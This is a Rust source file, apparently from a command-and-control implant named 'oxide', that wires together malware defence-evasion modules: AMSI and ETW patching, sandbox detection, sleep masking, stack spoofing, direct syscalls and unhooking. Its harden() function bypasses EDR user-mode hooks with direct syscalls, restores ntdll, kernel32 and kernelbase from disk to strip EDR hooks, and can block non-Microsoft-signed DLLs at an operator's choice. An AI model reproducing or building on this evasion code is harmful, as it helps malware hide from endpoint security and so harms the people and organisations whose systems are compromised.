pub mod amsi;
pub mod etw;
pub mod sandbox;
pub mod sleep_mask;
pub mod stack_spoof;
pub mod syscall;
pub mod unhook;

pub use sandbox::is_sandbox;
pub use sleep_mask::obfuscated_sleep;

use oxide_common::types::SleepObf;

/// Apply all configured process mitigations at startup.
///
/// Order matters: unhook must happen BEFORE amsi/etw patches so the patches
/// land on clean (unhooked) code rather than on bytes an EDR installed.
pub fn harden(block_dlls: bool) {
    // 1. Bootstrap direct-syscall stubs — must come first so all subsequent
    //    kernel calls bypass EDR user-mode hooks
    #[cfg(target_os = "windows")]
    syscall::ensure_init();

    // 2. Restore ntdll / kernel32 / kernelbase from disk — removes EDR hooks
    #[cfg(target_os = "windows")]
    unhook::unhook_all();

    // 3. Block non-Microsoft-signed DLLs (optional, configured by operator)
    #[cfg(target_os = "windows")]
    if block_dlls {
        apply_block_dlls();
    }
}

#[cfg(target_os = "windows")]
fn apply_block_dlls() {
    use windows_sys::Win32::System::Threading::{
        ProcessSignaturePolicy, SetProcessMitigationPolicy,
    };
    unsafe {
        let policy: u32 = 1; // MicrosoftSignedOnly
        SetProcessMitigationPolicy(
            ProcessSignaturePolicy,
            &policy as *const _ as *const _,
            std::mem::size_of::<u32>(),
        );
    }
}
